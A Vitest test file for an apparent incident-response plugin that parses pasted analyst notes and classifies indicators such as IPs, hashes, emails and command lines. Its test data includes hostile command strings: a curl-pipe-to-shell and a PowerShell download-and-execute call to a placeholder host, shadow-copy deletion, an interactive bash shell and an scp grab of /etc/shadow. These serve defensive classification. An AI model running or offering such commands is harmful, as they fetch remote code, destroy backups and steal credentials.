import { beforeEach, describe, expect, it, vi } from 'vitest'
import { FakeEl, fakeEvent } from '../../test/fakeDom'
import { makeTask } from '../types'
import { cleanDetailValue, detectDetailField, parseDetailLines, renderDetailsSection } from './DetailsSection'

const { notices } = vi.hoisted(() => ({ notices: [] as string[] }))

vi.mock('obsidian', async (importOriginal) => {
  const { FakeEl } = await import('../../test/fakeDom')
  return {
    ...(await importOriginal<object>()),
    Notice: class {
      constructor(message: string) {
        notices.push(message)
      }
      hide(): void {}
    },
    ExtraButtonComponent: class {
      extraSettingsEl = new FakeEl()
      constructor(parent: FakeEl) {
        parent.appendChild(this.extraSettingsEl)
      }
      setIcon(): this {
        return this
      }
      setTooltip(text: string): this {
        this.extraSettingsEl.setAttr('aria-label', text)
        return this
      }
    }
  }
})

beforeEach(() => {
  notices.length = 0
})

describe('parseDetailLines', () => {
  it('reads a pasted markdown table, its divider and markup left out', () => {
    const table = [
      '| User | **anita.garcia** |',
      '| --- | :---: |',
      '| Workstation | **corp-wks-102** |',
      '| IP | `10.0.1.135` |'
    ].join('\n')
    expect(parseDetailLines(table)).toEqual({
      rows: [
        { field: 'User', value: 'anita.garcia' },
        { field: 'Workstation', value: 'corp-wks-102' },
        { field: 'IP', value: '10.0.1.135' }
      ],
      unread: 0
    })
  })

  it('reads "Field: value" and tab pairs, and keeps a drive letter or a URL whole', () => {
    const text = [
      '- User: anita.garcia',
      'File path: C:\\Users\\anita\\x.exe',
      'URL: https://promptcraft.online/a',
      'Host\tcorp-wks-102',
      'Details:',
      'just prose'
    ].join('\n')
    expect(parseDetailLines(text)).toEqual({
      rows: [
        { field: 'User', value: 'anita.garcia' },
        { field: 'File path', value: 'C:\\Users\\anita\\x.exe' },
        { field: 'URL', value: 'https://promptcraft.online/a' },
        { field: 'Host', value: 'corp-wks-102' }
      ],
      unread: 2
    })
  })

  it('keeps a pipe that belongs to the value, in a "Field: value" or a tab pair', () => {
    const text = 'Command line: powershell -c "gci | select name"\nParent process\tcmd.exe /c a | b'
    expect(parseDetailLines(text)).toEqual({
      rows: [
        { field: 'Command line', value: 'powershell -c "gci | select name"' },
        { field: 'Parent process', value: 'cmd.exe /c a | b' }
      ],
      unread: 0
    })
    // A table row without its outer pipes still reads as one.
    expect(parseDetailLines('User | anita.garcia').rows).toEqual([{ field: 'User', value: 'anita.garcia' }])
  })

  it('keeps escaped pipes, inline markup and dunder names whole, and reads header lines as pairs', () => {
    const text = [
      '| Command line | whoami \\| findstr admin |',
      'Command line: `whoami` && `ipconfig`',
      'Module: __main__',
      'From: Amelia Hart <amelia.hart@lawson-rowe-review.com>',
      'Reg key: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
      "Analyst's note: benign"
    ].join('\n')
    expect(parseDetailLines(text).rows).toEqual([
      { field: 'Command line', value: 'whoami | findstr admin' },
      { field: 'Command line', value: '`whoami` && `ipconfig`' },
      { field: 'Module', value: '__main__' },
      { field: 'From', value: 'Amelia Hart <amelia.hart@lawson-rowe-review.com>' },
      { field: 'Reg key', value: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' },
      { field: "Analyst's note", value: 'benign' }
    ])
  })

  it('under a typed name, lines are kept as pasted: a crontab, a tab or a pipe row stays one value', () => {
    const text =
      '* 5 * * * /tmp/.x/run.sh\n4625\tAn account failed to log on\n| where EventID == 4625 | project Account'
    expect(parseDetailLines(text, { bareField: 'Note' }).rows).toEqual([
      { field: 'Note', value: '* 5 * * * /tmp/.x/run.sh' },
      { field: 'Note', value: '4625\tAn account failed to log on' },
      { field: 'Note', value: '| where EventID == 4625 | project Account' }
    ])
  })

  it('skips a Field | Value header row', () => {
    expect(parseDetailLines('| Field | Value |\n|---|---|\n| User | x |').rows).toEqual([{ field: 'User', value: 'x' }])
  })
})

function mount(details = [{ field: 'User', value: 'anita.garcia' }]) {
  const root = FakeEl.root()
  const task = makeTask({ details: details.map((d) => ({ ...d })) })
  const onChange = vi.fn<() => void>()
  renderDetailsSection(root as unknown as HTMLElement, task, { onChange })
  const add = root.find('.pm-details-add')
  const [field, value] = add.findAll('input')
  return { root, task, onChange, field, value, addBtn: add.find('button') }
}

describe('detectDetailField', () => {
  it('names an internal host a Hostname, defanged or not', () => {
    for (const v of [
      'DESKTOP1.domain.local',
      'WS01.corp.local',
      'dc01.ad.internal',
      'fs01.lan',
      'srv-02.vantara.corp',
      'nas.home.arpa',
      'WS01.corp.local:445',
      'DESKTOP1[.]domain[.]local',
      'DESKTOP1.domain.local.'
    ]) {
      expect([v, detectDetailField(v)]).toEqual([v, 'Hostname'])
    }
    for (const v of ['local', '.local', 'a..local', '-ws.local', 'my host.local', 'maya.chen@vantara.local']) {
      expect([v, detectDetailField(v)]).not.toEqual([v, 'Hostname'])
    }
  })

  it('names a value by its kind, defanged or not', () => {
    const cases: [string, string][] = [
      // Email
      ['maya.chen@vantara.local', 'Email'],
      ['amelia.hart[@]lawson-rowe-review[.]com', 'Email'],
      ["sean.o'brien@vantara.com", 'Email'],
      ['mailto:amelia.hart@lawson-rowe-review.com', 'Email'],
      ['Maya Chen <maya.chen@vantara.local>', 'Email'],
      ['"Hart, Amelia" <amelia.hart@lawson-rowe-review.com>', 'Email'],
      ['<amelia.hart@lawson-rowe-review.com>', 'Email'],
      // Message-ID
      ['<20261009022902.06.1a247614eaf9@lawson-rowe-review.com>', 'Message-ID'],
      ['<CAF=abc+xy@mail.gmail.com>', 'Message-ID'],
      // IP
      ['10.0.1.135', 'IP'],
      ['185.220.101.4:443', 'IP'],
      ['10.0.1[.]135', 'IP'],
      ['2001:db8::1', 'IP'],
      ['::ffff:10.0.0.5', 'IP'],
      ['[2001:db8::1]:443', 'IP'],
      ['fe80::1%eth0', 'IP'],
      ['185.220.101.0/24', 'IP'],
      ['10.0.0.0/8', 'IP'],
      // URL
      ['hxxps://promptcraft[.]online/a', 'URL'],
      ['https://en.wikipedia.org/wiki/Emotet_(malware)', 'URL'],
      ['ftp://files.evil.com/x', 'URL'],
      ['evil[.]com/payload.exe', 'URL'],
      ['www.evil.com/login.php?x=1', 'URL'],
      ['10.0.1.135:8080/x', 'URL'],
      ['bit.ly/3XkQ', 'URL'],
      // Domain
      ['lawson-rowe-review.com', 'Domain'],
      ['evil[.]app', 'Domain'],
      ['cisa.gov', 'Domain'],
      ['x.pages.dev', 'Domain'],
      ['bad.shop', 'Domain'],
      // Hash
      ['44d88612fea8a8f36de82e1278abb02f', 'Hash'],
      ['275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f', 'Hash'],
      ['sha256:275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f', 'Hash'],
      ['MD5: 44d88612fea8a8f36de82e1278abb02f', 'Hash'],
      [
        'cf83e1357eefb8bdf1542850d66d8007d620e4050b5715dc83f4a921d36ce9ce47d0d13c5d85f2b0ff8318d2877eec2f63b931bd47417a81a538327af927da3e',
        'Hash'
      ],
      // File path
      ['C:\\Users\\maya\\Downloads\\invoice.pdf.exe', 'File path'],
      ['C:\\Program Files\\App\\app.exe', 'File path'],
      ['C:/Users/maya/Downloads/x.exe', 'File path'],
      ['\\\\fs01\\share\\drop.zip', 'File path'],
      ['\\\\fs01\\Finance Share\\Q3.xlsx', 'File path'],
      ['%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.lnk', 'File path'],
      ['%TEMP%\\update.tmp', 'File path'],
      ['~/Library/LaunchAgents/com.evil.plist', 'File path'],
      ['/tmp/.x/payload.sh', 'File path'],
      ['invoice_0423.docx', 'File path'],
      ['invoice[.]pdf[.]exe', 'File path'],
      // Registry key
      ['HKCU\\Environment', 'Registry key'],
      ['HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 'Registry key'],
      ['HKEY_CURRENT_USER\\Software\\Classes', 'Registry key'],
      // User
      ['VANTARA\\maya.chen', 'User'],
      ['VANTARA\\CORP-WKS-102$', 'User'],
      ['VANTARA.LOCAL\\maya.chen', 'User'],
      ['NT AUTHORITY\\SYSTEM', 'User'],
      ['NT AUTHORITY\\NETWORK SERVICE', 'User'],
      // Command line
      ['powershell -nop -w hidden -enc SQBFAFgA', 'Command line'],
      ['"C:\\Windows\\System32\\cmd.exe" /c whoami', 'Command line'],
      ['C:\\Windows\\System32\\cmd.exe /c whoami', 'Command line'],
      ['C:\\Program Files\\App\\app.exe --flag', 'Command line'],
      ['C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe --no-sandbox', 'Command line'],
      ['vssadmin delete shadows /all /quiet', 'Command line'],
      ['schtasks /create /tn x /tr calc', 'Command line'],
      ['net user /domain', 'Command line'],
      ['whoami /all | more', 'Command line'],
      ['bash -c "curl http://x|sh"', 'Command line'],
      ['/bin/bash -i', 'Command line'],
      ['IEX (New-Object Net.WebClient).DownloadString("http://x")', 'Command line'],
      [
        '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "C:\\Users\\maya\\Invoice 4471.docm"',
        'Command line'
      ],
      ['"C:\\Windows\\System32\\cmd.exe" /c "whoami /all"', 'Command line'],
      ['cmd /c echo done: ok', 'Command line'],
      ['<jsmith01@vantara.com>', 'Email'],
      ['<noreply-2fa@vantara.com>', 'Email'],
      ['<security-operations-center@vantara.com>', 'Email'],
      ['<john12345@gmail.com>', 'Email'],
      ['<BN6PR11MB1234ABCD5678@BN6PR11MB1234.namprd11.prod.outlook.com>', 'Message-ID'],
      ['Maya Chen <maya.chen@vantara.local>;', 'Email'],
      ["'maya.chen@vantara.local' <maya.chen@vantara.local>", 'Email'],
      ['maya.chen@vantara.com.', 'Email'],
      ['support@p\u0430ypal.com', 'Email'],
      ['jos\u00e9@example.com', 'Email'],
      ['Windows\\Temp', 'File path']
    ]
    for (const [value, field] of cases) expect([value, detectDetailField(value)]).toEqual([value, field])
  })

  it('reads a value out of list, code or quote markup around it', () => {
    for (const value of [
      '- 10.0.1.135',
      '* maya.chen@vantara.local',
      '1. 10.0.1.135',
      '- [ ] 10.0.1.135',
      '> 10.0.1.135'
    ]) {
      expect([value, detectDetailField(value)]).not.toEqual([value, null])
    }
    expect(cleanDetailValue('- `maya.chen@vantara.local`')).toBe('maya.chen@vantara.local')
    expect(cleanDetailValue('"10.0.1.135",')).toBe('10.0.1.135')
    expect(cleanDetailValue('(10.0.1.135)')).toBe('10.0.1.135')
    expect(cleanDetailValue('maya.chen@vantara.local.\u200b')).toBe('maya.chen@vantara.local')
    expect(cleanDetailValue('maya.chen@vantara.com.')).toBe('maya.chen@vantara.com')
    for (const kept of [
      '"C:\\Windows\\System32\\cmd.exe" /c "whoami /all"',
      'scp root@10.0.0.5:/etc/shadow .',
      'cmd.exe /c cd ..',
      '* * * * * /tmp/x.sh',
      '`a` and `b`'
    ]) {
      expect(cleanDetailValue(kept)).toBe(kept)
    }
    expect(cleanDetailValue(' '.repeat(100000) + 'x')).toBe('x') // no slow path on long padding
    expect(cleanDetailValue('https://en.wikipedia.org/wiki/Emotet_(malware)')).toBe(
      'https://en.wikipedia.org/wiki/Emotet_(malware)'
    )
  })

  it('says nothing for a value that does not say what it is', () => {
    const values = [
      'corp-wks-102',
      'anita.garcia',
      'first.middle.last',
      'Finance',
      'two words',
      'at noon',
      'RE: Outstanding invoice 0423',
      'PowerShell Empire',
      'svchost.exe (PID 4120)',
      'powershell.exe, cmd.exe',
      'winword.exe -> powershell.exe',
      'At 09:15 UTC',
      'SSH login from 203.0.113.5:51234',
      'Mimikatz detected at 14:23',
      'setup.exe - signed by Microsoft',
      'chalk@5.6.1',
      'root@10.0.0.5',
      'BUILTIN\\Administrators',
      '',
      '2026-10-09',
      'a\nb'
    ]
    for (const value of values) expect([value, detectDetailField(value)]).toEqual([value, null])
  })
})

describe('renderDetailsSection', () => {
  /** A paste the box takes itself: the event, then the text lands and 'input' says how. */
  const paste = (box: FakeEl, text: string) => {
    const e = fakeEvent('paste', { clipboardData: { getData: () => text } })
    box.dispatchEvent(e)
    if (!e.defaultPrevented) {
      box.value += text
      box.dispatchEvent(fakeEvent('input', { inputType: 'insertFromPaste' }))
    }
    return e
  }

  it('adds a row from the add line, on Add or on Enter in the value', () => {
    const { root, task, onChange, field, value, addBtn } = mount()
    field.value = ' Workstation '
    value.value = 'corp-wks-102'
    addBtn.click()
    field.value = 'IP'
    value.value = '10.0.1.135'
    value.dispatchEvent(fakeEvent('keydown', { key: 'Enter' }))
    expect(task.details).toEqual([
      { field: 'User', value: 'anita.garcia' },
      { field: 'Workstation', value: 'corp-wks-102' },
      { field: 'IP', value: '10.0.1.135' }
    ])
    expect(onChange).toHaveBeenCalledTimes(2)
    expect(root.find('.pm-modal-section-title').textContent).toBe('Details (3)')
    expect(field.value).toBe('')
  })

  it("leaves Shift+Enter to the dialog's save", () => {
    const { task, field, value } = mount()
    field.value = 'IP'
    value.value = '10.0.1.135'
    const shiftEnter = fakeEvent('keydown', { key: 'Enter', shiftKey: true })
    value.dispatchEvent(shiftEnter)
    expect(shiftEnter.propagationStopped).toBe(false)
    expect(task.details).toHaveLength(1)
  })

  it('adds nothing without both a field and a value', () => {
    const { task, onChange, field, value, addBtn } = mount()
    value.value = 'orphan'
    addBtn.click()
    field.value = 'User'
    value.value = '  '
    addBtn.click()
    expect(task.details).toHaveLength(1)
    expect(onChange).not.toHaveBeenCalled()
  })

  it('edits a value in place; emptying it removes the row and the key with the last one', () => {
    const { root, task, onChange } = mount()
    const valueInput = () => root.find('.pm-details-rows').findAll('input')[1]
    valueInput().value = 'a.garcia'
    valueInput().dispatchEvent(fakeEvent('change'))
    expect(task.details).toEqual([{ field: 'User', value: 'a.garcia' }])
    valueInput().value = ''
    valueInput().dispatchEvent(fakeEvent('change'))
    expect(task.details).toBeUndefined()
    expect(onChange).toHaveBeenCalledTimes(2)
  })

  it('an emptied field name is put back rather than saved blank', () => {
    const { root, task, onChange } = mount()
    const fieldInput = root.find('.pm-details-rows').findAll('input')[0]
    fieldInput.value = ''
    fieldInput.dispatchEvent(fakeEvent('change'))
    expect(fieldInput.value).toBe('User')
    expect(task.details).toEqual([{ field: 'User', value: 'anita.garcia' }])
    expect(onChange).not.toHaveBeenCalled()
  })

  it('a pasted table becomes rows at once, saying what it skipped', () => {
    const { task, value } = mount()
    const text = '| User | anita.garcia |\n| Workstation | corp-wks-102 |\nnot a pair'
    const paste = fakeEvent('paste', { clipboardData: { getData: () => text } })
    value.dispatchEvent(paste)
    expect(paste.defaultPrevented).toBe(true)
    expect(task.details).toEqual([
      { field: 'User', value: 'anita.garcia' },
      { field: 'Workstation', value: 'corp-wks-102' }
    ])
    expect(notices).toEqual(['Added 1 detail · 1 already recorded · 1 line not read as "Field: value"'])
  })

  it('a value pasted into the value box names the empty field; the next one renames it, a typed name stays', () => {
    const { task, field, value } = mount()
    expect(paste(value, 'maya.chen@vantara.local').defaultPrevented).toBe(false)
    expect([field.value, value.value]).toEqual(['Email', 'maya.chen@vantara.local'])
    value.value = ''
    paste(value, '10.0.1.135')
    expect(field.value).toBe('IP')
    value.value = ''
    paste(value, 'corp-wks-102')
    expect(field.value).toBe('')
    field.value = 'Attacker'
    field.dispatchEvent(fakeEvent('input'))
    value.value = ''
    paste(value, 'amelia.hart@lawson-rowe-review.com')
    expect(field.value).toBe('Attacker')
    value.dispatchEvent(fakeEvent('keydown', { key: 'Enter' }))
    expect(task.details?.at(-1)).toEqual({ field: 'Attacker', value: 'amelia.hart@lawson-rowe-review.com' })
  })

  it('a value pasted into the field box goes to the value box, named by its kind', () => {
    const { field, value } = mount()
    const e = fakeEvent('paste', { clipboardData: { getData: () => ' 10.0.1.135\n' } })
    field.dispatchEvent(e)
    expect(e.defaultPrevented).toBe(true)
    expect([field.value, value.value]).toEqual(['IP', '10.0.1.135'])
  })

  it('a "Known field: value" line pasted into the field box fills both; the value box keeps a line whole', () => {
    const { field, value } = mount()
    paste(field, 'Workstation: corp-wks-102')
    expect([field.value, value.value]).toEqual(['Workstation', 'corp-wks-102'])
    field.value = value.value = ''
    expect(paste(value, 'Workstation: corp-wks-102').defaultPrevented).toBe(false)
    expect([field.value, value.value]).toEqual(['', 'Workstation: corp-wks-102'])
    field.value = value.value = ''
    expect(paste(value, 'cmd /c echo done: ok').defaultPrevented).toBe(false)
    expect([field.value, value.value]).toEqual(['Command line', 'cmd /c echo done: ok'])
  })

  it('a value typed with no field is named on leaving the box, or on Enter', () => {
    const { task, field, value } = mount()
    value.value = 'promptcraft.online'
    value.dispatchEvent(fakeEvent('change'))
    expect(field.value).toBe('Domain')
    field.value = ''
    value.value = '185.220.101.4'
    value.dispatchEvent(fakeEvent('keydown', { key: 'Enter' }))
    expect(task.details?.at(-1)).toEqual({ field: 'IP', value: '185.220.101.4' })
  })

  it('pasted lines of bare values become rows named by their kind', () => {
    const { task, value } = mount()
    const text = '- maya.chen@vantara.local\n* `10.0.1.135`\ncorp-wks-102'
    value.dispatchEvent(fakeEvent('paste', { clipboardData: { getData: () => text } }))
    expect(task.details?.slice(1)).toEqual([
      { field: 'Email', value: 'maya.chen@vantara.local' },
      { field: 'IP', value: '10.0.1.135' }
    ])
    expect(notices).toEqual(['Added 2 details · 1 line not read as "Field: value"'])
  })

  it('a pasted command, query or subject lands whole, as pasted', () => {
    const { task, field, value } = mount()
    for (const text of ['whoami /all | more', 'RE: Outstanding invoice 0423', 'SigninLogs | where x == 1']) {
      field.value = value.value = ''
      expect([text, paste(value, text).defaultPrevented, value.value]).toEqual([text, false, text])
    }
    // A field this case already uses counts as known in the field box.
    task.details?.push({ field: 'Attacker', value: 'x@y.com' })
    field.value = value.value = ''
    paste(field, 'Attacker: amelia@lawson-rowe-review.com')
    expect([field.value, value.value]).toEqual(['Attacker', 'amelia@lawson-rowe-review.com'])
  })

  it('a subject pasted into the field box stays whole in the value box, unnamed', () => {
    const { field, value } = mount()
    for (const text of ['RE: Invoice 4471', 'Urgent: Wire transfer']) {
      field.value = value.value = ''
      const e = fakeEvent('paste', { clipboardData: { getData: () => text } })
      field.dispatchEvent(e)
      expect([e.defaultPrevented, field.value, value.value]).toEqual([true, '', text])
    }
    field.value = value.value = ''
    field.dispatchEvent(fakeEvent('paste', { clipboardData: { getData: () => 'Hostname: corp-wks-102' } }))
    expect([field.value, value.value]).toEqual(['Hostname', 'corp-wks-102'])
  })

  it('a schema name pasted into the field box stays the name, a value moves out', () => {
    const { field, value } = mount()
    expect(paste(field, 'event.id').defaultPrevented).toBe(false)
    expect([field.value, value.value]).toEqual(['event.id', ''])
    field.value = ''
    paste(field, 'VANTARA\\maya.chen')
    expect([field.value, value.value]).toEqual(['User', 'VANTARA\\maya.chen'])
  })

  it('a value pasted into the field box is named by the add line, so the next value renames it', () => {
    const { task, field, value } = mount()
    paste(field, '10.0.1.135')
    expect([field.value, value.value]).toEqual(['IP', '10.0.1.135'])
    value.value = ''
    paste(value, 'maya.chen@vantara.local')
    expect(field.value).toBe('Email')
    field.value = value.value = ''
    paste(field, 'evil.com') // a bare domain could be a name (log.info, event.id): it stays one
    expect([field.value, value.value]).toEqual(['evil.com', ''])
    expect(task.details).toHaveLength(1)
  })

  it('a name the add line wrote stays when the value is edited past its kind', () => {
    const { task, value } = mount()
    paste(value, '10.0.1.135')
    value.value = '10.0.1.135 (C2)'
    value.dispatchEvent(fakeEvent('change'))
    value.dispatchEvent(fakeEvent('keydown', { key: 'Enter' }))
    expect(task.details?.at(-1)).toEqual({ field: 'IP', value: '10.0.1.135 (C2)' })
  })

  it('lines pasted under a typed name leave a value waiting in the box alone', () => {
    const { field, value } = mount()
    field.value = 'Recipients'
    field.dispatchEvent(fakeEvent('input'))
    value.value = 'first.person@vantara.com'
    const e = fakeEvent('paste', { clipboardData: { getData: () => 'maya.chen@vantara.local\namelia@lawson.com' } })
    value.dispatchEvent(e)
    expect([field.value, value.value]).toEqual(['', 'first.person@vantara.com'])
  })

  it('a name pasted over a self-filled one replaces it', () => {
    const { field, value } = mount()
    value.value = '10.0.1.135'
    value.dispatchEvent(fakeEvent('change'))
    const e = fakeEvent('paste', { clipboardData: { getData: () => 'Source IP' } })
    field.dispatchEvent(e)
    expect(e.defaultPrevented).toBe(false)
    expect(field.value).toBe('') // the box's own paste then puts 'Source IP' in alone
  })

  it('an indicator pasted in markup is shown unwrapped as it is named; other values stay as pasted', () => {
    const { field, value } = mount()
    expect(paste(value, '- `maya.chen@vantara.local`').defaultPrevented).toBe(false)
    expect([field.value, value.value]).toEqual(['Email', 'maya.chen@vantara.local'])
    field.value = value.value = ''
    paste(value, '"C:\\Windows\\System32\\cmd.exe" /c "whoami /all"')
    expect([field.value, value.value]).toEqual(['Command line', '"C:\\Windows\\System32\\cmd.exe" /c "whoami /all"'])
    field.value = value.value = ''
    paste(value, 'pay\u200bpal.com')
    expect(value.value).toBe('pay\u200bpal.com') // an obfuscated name is evidence
  })

  it('typing into a self-named field replaces the name rather than joining it', () => {
    const { field, value } = mount()
    value.value = '10.0.1.135'
    value.dispatchEvent(fakeEvent('change'))
    expect(field.value).toBe('IP')
    const typing = fakeEvent('beforeinput', { inputType: 'insertText', data: 'S' })
    field.dispatchEvent(typing)
    expect([typing.defaultPrevented, field.value]).toEqual([true, 'S'])
  })

  it('pasted subjects, commands and log lines are not split at their own colon', () => {
    const { task, field, value } = mount()
    field.value = 'Subject'
    field.dispatchEvent(fakeEvent('input'))
    value.dispatchEvent(
      fakeEvent('paste', { clipboardData: { getData: () => 'RE: Invoice 4471\nFW: Payment advice' } })
    )
    expect(task.details?.slice(1)).toEqual([
      { field: 'Subject', value: 'RE: Invoice 4471' },
      { field: 'Subject', value: 'FW: Payment advice' }
    ])
    const lines = parseDetailLines(
      'schtasks /create /tn "Update: daily" /tr C:\\x.exe\nOct 17 14:23:05 web01 sshd[1234]: Failed'
    )
    expect(lines).toEqual({
      rows: [{ field: 'Command line', value: 'schtasks /create /tn "Update: daily" /tr C:\\x.exe' }],
      unread: 1
    })
  })

  it('pasted lines of values take a field name the analyst typed, then clear it', () => {
    const { task, field, value } = mount()
    field.value = 'Recipients'
    field.dispatchEvent(fakeEvent('input'))
    const text = '- maya.chen@vantara.local\n- amelia.hart@lawson-rowe-review.com'
    value.dispatchEvent(fakeEvent('paste', { clipboardData: { getData: () => text } }))
    expect(task.details?.slice(1)).toEqual([
      { field: 'Recipients', value: 'maya.chen@vantara.local' },
      { field: 'Recipients', value: 'amelia.hart@lawson-rowe-review.com' }
    ])
    expect(field.value).toBe('')
  })

  it('a single pasted line pastes into the box as usual', () => {
    const { task, value } = mount()
    const paste = fakeEvent('paste', { clipboardData: { getData: () => 'corp-wks-102' } })
    value.dispatchEvent(paste)
    expect(paste.defaultPrevented).toBe(false)
    expect(task.details).toHaveLength(1)
  })
})
